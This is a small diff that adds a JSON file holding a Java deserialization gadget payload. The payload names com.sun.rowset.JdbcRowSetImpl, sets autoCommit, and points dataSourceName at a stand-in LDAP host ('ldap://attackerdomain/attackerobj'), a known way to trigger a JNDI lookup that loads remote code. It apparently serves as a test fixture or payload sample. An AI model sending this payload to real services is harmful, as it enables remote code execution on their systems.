@@ -1,0 +1,5 @@
+["com.sun.rowset.JdbcRowSetImpl", { 
+	"dataSourceName":
+		"ldap://attackerdomain/attackerobj", 
+	"autoCommit" : true
+}]
